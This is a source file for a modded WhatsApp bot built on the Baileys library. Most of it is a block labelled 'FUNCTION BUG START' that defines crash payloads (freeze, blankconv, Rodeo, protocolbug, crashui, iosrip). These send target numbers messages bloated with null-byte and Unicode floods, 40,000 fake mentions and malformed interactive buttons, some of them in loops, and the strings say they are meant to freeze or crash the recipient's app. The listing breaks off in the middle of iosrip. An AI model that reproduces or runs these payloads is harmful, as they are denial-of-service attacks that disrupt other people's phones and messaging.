
/*─────────────────────────────────────────
  Modded By ElangGanzz and VilLModss   
──────────────────────────────────────────*/

require('../settings/config');


const JsConfuser = require('js-confuser');
const BodyForm = require('form-data')
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch")
const crypto = require('crypto');
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');

const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

module.exports = gzteam = async (gzteam, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? gzteam.user.id.split(":")[0] + "@s.whatsapp.net" || gzteam.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");

        const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
        const listpremium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        const botNumber = await gzteam.decodeJid(gzteam.user.id);
        const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const Access2 = [botNumber, ...listpremium, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await gzteam.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
        const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, formatSize, getGroupAdmins } = require('./lib/myfunction.js');
		const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter');
		const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader');
        
        const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
                
        const cihuy = fs.readFileSync('./start/lib/media/orderM.png')
        const kurumi = fs.readFileSync('./start/lib/media/kurumi.mp4')
        const kucing = fs.readFileSync('./start/lib/media/kucing.png')
        const { fquoted } = require('./lib/fquoted')
        
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`× New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   × Tanggal: ${new Date().toLocaleString()} \n` +
                    `   × Pesan: ${m.body || m.mtype} \n` +
                    `   × Pengirim: ${pushname} \n` +
                    `   × JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#ffffff").black(
                        `   × Grup: ${groupName} \n` +
                        `   × GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }

        //menghapus statusMention di Group
        if (m.mtype.includes("groupStatusMentionMessage") && m.isGroup) {
            await gzteam.deleteMessage(m.chat, m.key);
        }
        
        const reaction = async (jidss, emoji) => {
            gzteam.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        async function reply(text) {
            gzteam.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "¿? 𝘖𝘞𝘈𝘙𝘐 𝘝2 | ɢᴢ ᴀʟᴡᴀʏs ¿?",
                        body: "#ɢᴢʟɪᴇɴᴛ #ᴏᴡᴀʀɪ #ᴏᴡʀᴠғx",
                        thumbnail: cihuy,
                        sourceUrl: 'https://www.tiktok.com/zoxhzxc',
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }
        
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };
        //FUNCTION BUG START
        const virtext = "ꦾ".repeat(89999);
        const overload = "\u0000".repeat(333333);
        const Null = {
      key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"GZTEAMALWAYS\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"villxhome@crash.home\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\u0000".repeat(500000) + "\",\"screen_0_TextInput_1\":\"VillExecNeverFail\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };

async function earth(x) {
    const Earth = {
      key: {
        remoteJid: "13135559098@s.whatsapp.net",
        fromMe: false,
        participant: "13135559098@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "single_select",
            paramsJson: "{ status: true }",
            version: 3
          }
        }
      }
    }
    gzteam.sendMessage(x, {
                text: "fresh ™gz",
            }, { quoted: earth })
    }

async function stickerDelay(gz) {
gzteam.relayMessage(gz, {
stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        }
}, { quoted: Null, participant: { jid: number }})
}

async function freeze(target, count) {
let travas = "ꦽ".repeat(15000)
    for (let i = 0; i < count; i++) {
         gzteam.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    "interactiveMessage": {
                        "header": {
                            "title": "𝘠𝘰𝘶𝘳 𝘊𝘩𝘢𝘵 𝘩𝘢𝘷𝘦 𝘣𝘦𝘦𝘯 𝘧𝘳𝘦𝘦𝘻𝘦𝘥 🥔👁 𝙂𝙕𝘾𝙇𝙄𝙀𝙉𝙏 #𝙑𝙄𝙇𝙇𝙀𝙓𝙀𝘾 (𝚆𝙷𝙰𝚃 𝙷𝙰𝙿𝙿𝙴𝙽 𝚆𝙸𝚃𝙷 𝚈𝙾𝚄 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿?) " + travas,
                            "hasMediaAttachment": true,
                            "imageMessage": {
                                "url": "https://mmg.whatsapp.net/v/t62.7118-24/21391932_1161272905998313_4827991675750411452_n.enc?ccb=11-4&oh=01_Q5AaIGWHQEOBVWT_vIOLOFRS1Nc7RNqVQMTpdDPY02X8-bvS&oe=67C1FF81&_nc_sid=5e03e0&mms3=true",
                                "mimetype": "image/jpeg",
                                "fileSha256": "Wnf6QkilVowZ5j2UfTlNNF3LQ8g16qLi3QzYXhiObO0=",
                                "fileLength": "92017",
                                "height": 9999,
                                "width": 9999,
                                "mediaKey": "+wjoVJDg2Pm/EuVm8RzntXdG26Xep6gZu/Rs2zRL/WI=",
                                "fileEncSha256": "WwDDQTugpE0UEcNt/dwSNuHUBRKFEuebiSaB6NDAoHE=",
                                "directPath": "/v/t62.7118-24/21391932_1161272905998313_4827991675750411452_n.enc?ccb=11-4&oh=01_Q5AaIGWHQEOBVWT_vIOLOFRS1Nc7RNqVQMTpdDPY02X8-bvS&oe=67C1FF81&_nc_sid=5e03e0",
                                "mediaKeyTimestamp": "1738184318"
                            }
                        },
                        "body": {
                            "text": "𝙸'𝙼 𝙽𝙾𝚃 𝙷𝙰𝚅𝙴 𝙳𝙴𝙰𝙳𝙻𝙸𝙽𝙴 - What happen?" + "\u0000".repeat(8888)
                        },
                        "nativeFlowMessage": {
                            "buttons": [{
                                "name": "galaxy_message",
                                "buttonParamsJson": JSON.stringify({
                                    "header": "Freezing ALWAYS; ",
                                    "body": "xxx",
                                    "flow_action": "navigate",
                                    "flow_action_payload": { screen: "FORM_SCREEN" },
                                    "flow_cta": '𝘚𝘪𝘮𝘱𝘭𝘦 𝘣𝘶𝘵 𝘤𝘳𝘢𝘴𝘩 𝘹𝘹𝘹𝘹𝘹𝘹𝘹𝘹' + travas + travas,
                                    "flow_id": "1169834181134583",
                                    "flow_message_version": "3",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                })
}]
                        },
                        'contextInfo': {
                            'isForwarded': true,
                            'fromMe': false,
                            'participant': '0@s.whatsapp.net',
                            'remoteJid': target,
                            'quotedMessage': {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/pdf",
                                    title: "crash",
                                    pageCount: 1000000000,
                                    fileName: "#gzgzteam.pdf",
                                    contactVcard: true
                                }
                            }
                        }
                    }
                }
            }
        }, {});
    }

    // Send confirmation message with an image
}

async function blankconv(target, count) {
let travas = "ꦽ".repeat(15000)
    for (let i = 0; i < count; i++) {
         gzteam.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    "interactiveMessage": {
                        "header": {
                            "title": "𝘠𝘰𝘶𝘳 𝘊𝘩𝘢𝘵 𝘩𝘢𝘷𝘦 𝘣𝘦𝘦𝘯 𝘧𝘳𝘦𝘦𝘻𝘦𝘥 🥔👁 𝙂𝙕𝘾𝙇𝙄𝙀𝙉𝙏 #𝙑𝙄𝙇𝙇𝙀𝙓𝙀𝘾 (𝚆𝙷𝙰𝚃 𝙷𝙰𝙿𝙿𝙴𝙽 𝚆𝙸𝚃𝙷 𝚈𝙾𝚄 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿?) " + travas,
                            "hasMediaAttachment": true,
                            "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/14733917_1149114643564252_1411501314835682405_n.enc?ccb=11-4&oh=01_Q5Aa1QEyDyeAosbA5mD5D2vPVuFhEQ2KHLD1XlTgHH26FOV7cQ&oe=6833A57E&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/",
    "fileSha256": "YPCWZXVNuteUb7av2HAzqJoXT5t3+Vmsis21dUcuOzE=",
    "fileLength": "99999",
    "pageCount": 99999,
    "mediaKey": "RoKZdKy+oz3+J9gWG5HymninnpcZpl2zzMrmij/3nIY=",
    "fileName": "𝙂𝙕 𝙁𝙍𝙀𝙀𝙕𝙄𝙉𝙂." + "ꦽ".repeat(35000),
    "fileEncSha256": "itD1HalhWwDvFh8+De67996Ql2ilH7lENE5GEL1JEz0=",
    "directPath": "/v/t62.7119-24/14733917_1149114643564252_1411501314835682405_n.enc?ccb=11-4&oh=01_Q5Aa1QEyDyeAosbA5mD5D2vPVuFhEQ2KHLD1XlTgHH26FOV7cQ&oe=6833A57E&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1745633109"
  }
                        },
                        "body": {
                            "text": "𝙸'𝙼 𝙽𝙾𝚃 𝙷𝙰𝚅𝙴 𝙳𝙴𝙰𝙳𝙻𝙸𝙽𝙴 - What happen?" + "\u0000".repeat(8888)
                        },
                        "nativeFlowMessage": {
                            "buttons": [{
                                "name": "galaxy_message",
                                "buttonParamsJson": JSON.stringify({
                                    "header": "Freezing ALWAYS; ",
                                    "body": "xxx",
                                    "flow_action": "navigate",
                                    "flow_action_payload": { screen: "FORM_SCREEN" },
                                    "flow_cta": '𝘚𝘪𝘮𝘱𝘭𝘦 𝘣𝘶𝘵 𝘤𝘳𝘢𝘴𝘩 𝘹𝘹𝘹𝘹𝘹𝘹𝘹𝘹' + travas + travas,
                                    "flow_id": "1169834181134583",
                                    "flow_message_version": "3",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                })
},
{
                  name: "call_permission_request",
                  buttonParamsJson: "{`Your Whatsapp Have been Crash`}",
}]
                        },
                        'contextInfo': {
                            'isForwarded': true,
                            'fromMe': false,
                            'participant': '0@s.whatsapp.net',
                            'remoteJid': target,
                            'quotedMessage': {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/",
                                    title: "crash" + "\u0000".repeat(8888),
                                    pageCount: 1000000000,
                                    fileName: "#gzgzteam.pdf" + "\u0000".repeat(8888),
                                    contactVcard: true
                                }
                            }
                        }
                    }
                }
            }
        }, {});
    }

    // Send confirmation message
}

async function outofsync(number) {
    await gzteam.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@𝙂𝙕𝙏𝙀𝘼𝙈 - #VILL | 🩸",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: number }});
}


      
async function Rodeo(target, count) {
  for (let r = 0; r < count; r++) {
  let msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "".repeat(8888),
              hasMediaAttachment: false, 
              contextInfo: {
                        forwardingScore: 6,
                        isForwarded: true,
                        remoteJid: "X",
                        participant: "0@s.whatsapp.net",
                        stanzaId: "1234567890ABCDEF",
                        quotedMessage: { 
                        message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"GZTEAMALWAYS\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Always-DELAYXCRASH\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\u0000".repeat(800000) + "\",\"screen_0_TextInput_1\":\"VillExecNeverFail\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }}}
                    }
            },
            body: {
              text: "📵 𝘝𝘐𝘓𝘓 - 𝘌𝘟𝘌𝘊 🥀" + "ꦾ".repeat(19999),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: `{ status: true }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: " Your Whatsapp Have been Crash ",
                },
                {
                  name: "mpm",
                  buttonParamsJson: `{null}`,
                },
                {
                  name: "single_select",
                  buttonParamsJson: `Huh? GZTEAM Always Beast in anywhere`,
                },
                {
                  name: "cta_url",
                  buttonParamsJson: ``,
                },
                                {
                  name: "cta_copy",
                  buttonParamsJson: `\u0000`.repeat(500000),
                },
                {
                  name: "review_and_pay",
                  buttonParamsJson: `{ status: true }`,
                },
                {
                  name: "cta_call",
                  buttonParamsJson: `{ status: true }`,
                  version: 3
                },
                
              ],
            },
          },
        },
      },
    },
    {}
  );

  await gzteam.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await sleep(1500);
}
}
          
async function protocolbug(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await gzteam.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}        
                  
async function fresh(gz) {
gzteam.sendMessage(gz, {
                text: "FRESH - FRESH GZ" + "\n\n\n".repeat(99) + " fresh ™gz",
            }, { quoted: m })
            }
async function crashui(number) {
await gzteam.relayMessage(number, {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    text: "🩸⃟⃨〫⃰‣ ⁖𝘎𝘡𝘛𝘌𝘈𝘔 𝘛𝘙𝘖𝘜𝘎𝘏𝘛 𝘚𝘠𝘚𝘛𝘌𝘔 𝘜𝘐 ‣—" + "ꦾ".repeat(89999),
                    contentText: "🩸⃟⃨〫⃰‣ ⁖𝘎𝘡𝘛𝘌𝘈𝘔 𝘈𝘓𝘞𝘈𝘠𝘚 𝘉𝘌𝘈𝘚𝘛 ‣—" + "ꦾ".repeat(89999),
                    contextInfo: {
                        forwardingScore: 6,
                        isForwarded: true,
                        remoteJid: "X",
                        participant: "0@s.whatsapp.net",
                        stanzaId: "1234567890ABCDEF",
                        quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 } }
                    },
                    headerType: 1
                }
            }
        }
      }, { participant: { jid: number } });
      }
      
async function protocolbug2(isTarget) {

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𝘌𝘭𝘢𝘯𝘨𝘎𝘢𝘯𝘻𝘻" + "ោ៝".repeat(10000),
        title: "𝙶𝚉𝚃𝙴𝙰𝙼 𝙰𝙻𝚆𝙰𝚈𝚂",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/19251741_9547267395309909_7401212157780294586_n.enc?ccb=11-4&oh=01_Q5Aa1QFKsOXCJ9jB6yanUiU-3BxeLbyrUwoOWNwK0P7bVBabHA&oe=683E6FDD&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "vgrAz+L0G2ynJ4yP7JZxehhTDhtyQozlU2Eq/7TdiwM=",
    fileLength: "7324143",
    seconds: 15,
    mediaKey: "WpEQWYhuRePz30+lV5UwKhkwX1CjEUHj0Mlu48U0CWI=",
    caption: "🥀 GZ Always ? (𝘖𝘰𝘱𝘴 𝘜𝘯𝘦𝘹𝘱𝘦𝘤𝘵𝘦𝘥 𝘊𝘳𝘢𝘴𝘩)",
    height: 720,
    width: 1326,
    fileEncSha256: "CYLMNhgS9//RqombJ+SDhmAmasvsSI0jFKueFo62y+E=",
    directPath: "/v/t62.7161-24/19251741_9547267395309909_7401212157780294586_n.enc?ccb=11-4&oh=01_Q5Aa1QFKsOXCJ9jB6yanUiU-3BxeLbyrUwoOWNwK0P7bVBabHA&oe=683E6FDD&_nc_sid=5e03e0&_nc_hot=1746344218",
    mediaKeyTimestamp: "1746344131",
        contextInfo: {
            isSampled: true,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝘎𝘡 𝘈𝘭𝘸𝘢𝘺𝘴‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await gzteam.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

   
}

async function iosrip(target) {
for (let i = 0; i < 2; i++) {
gzteam.relayMessage(target, {
  "contactMessage": {
    "displayName": "🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>" + "𑇂𑆵𑆴𑆿".repeat(10000),
